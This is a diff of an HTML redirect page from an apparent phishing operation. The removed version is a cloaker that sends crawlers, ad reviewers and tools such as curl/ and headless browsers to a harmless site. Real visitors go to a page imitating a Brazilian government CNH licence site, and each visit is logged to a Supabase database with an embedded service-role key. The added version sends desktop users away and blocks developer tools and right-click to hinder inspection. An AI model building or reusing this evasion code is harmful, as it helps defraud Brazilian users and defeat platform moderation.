@@ -1,86 +1,30 @@
 <!DOCTYPE html>
-<!-- v3 -->
 <html>
 <head>
 <meta charset="UTF-8">
 <title>Carregando...</title>
-<style>
-body{background:#fff;margin:0;padding:0;}
-.loader{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;font-family:sans-serif;color:#666}
-.spinner{width:32px;height:32px;border:3px solid #eee;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
-@keyframes spin{to{transform:rotate(360deg)}}
-</style>
 </head>
 <body>
-<div class="loader"><div class="spinner"></div><span>Carregando...</span></div>
 <script>
-(function(){
-  var WHITE = "https://www.bolonahora.com.br/";
-  var BLACK = "https://novacnh-brasil-gov-br.netlify.app/";
-  var SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
-  var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";
-
-  // Apenas bots de sistema — nao sao humanos de jeito nenhum
-  var BOT_UA = [
-    "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
-    "googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot",
-    "applebot","msnbot","python-requests","python-urllib","curl/","wget/",
-    "scrapy","java/","libwww","httpclient","okhttp","node-fetch","postman",
-    "headlesschrome","phantomjs","selenium","puppeteer","playwright",
-    "commoncrawl","archive.org","dataforseo","netsystemsresearch"
-  ];
-
-  function isBotUA() {
-    var ua = (navigator.userAgent || "").toLowerCase();
-    for (var i = 0; i < BOT_UA.length; i++) {
-      if (ua.indexOf(BOT_UA[i]) !== -1) return true;
+(function() {
+  function isMobile() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
+  if (!isMobile()) {
+    alert("Clique em Ok para ir para o site.");
+    window.location.href = "https://www.gov.br/pf/pt-br";
+  }
+  document.addEventListener("keydown", function(event) {
+    if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
+      event.preventDefault();
+      alert("Acesso negado às ferramentas de desenvolvedor!");
+      window.location.href = "https://autoescolas.com.br/ba";
     }
-    // webdriver automatizado
-    if (navigator.webdriver) return true;
-    return false;
-  }
-
-  function appendUtms(url) {
-    var params = new URLSearchParams(window.location.search);
-    var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
-    var dest = new URLSearchParams();
-    keys.forEach(function(k){ var v = params.get(k); if(v) dest.set(k,v); });
-    var qs = dest.toString();
-    return qs ? url + (url.indexOf("?") === -1 ? "?" : "&") + qs : url;
-  }
-
-  function log(result, reason, ip, country) {
-    try {
-      fetch(SB_URL + "/rest/v1/cloaker_logs", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "apikey": SB_KEY,
-          "Authorization": "Bearer " + SB_KEY
-        },
-        body: JSON.stringify({
-          user_agent: navigator.userAgent,
-          result: result,
-          reason: reason,
-          country: country || "BR",
-          ip: ip || null
-        })
-      });
-    } catch(e) {}
-  }
-
-  // Bot de sistema — manda para white
-  if (isBotUA()) {
-    log("BOT", "User-agent bot detectado", null, "?");
-    window.location.replace(WHITE);
-    return;
-  }
-
-  // TODOS OS OUTROS — entra no site e registra como REAL
-  // Loga imediatamente e redireciona sem esperar geo
-  log("REAL", "Clique direto - sem filtro", null, "BR");
-  window.location.replace(appendUtms(BLACK));
-
+  });
+  document.addEventListener("contextmenu", function(event) {
+    event.preventDefault();
+    alert("Botão direito desativado!");
+  });
 })();
 </script>
 </body>
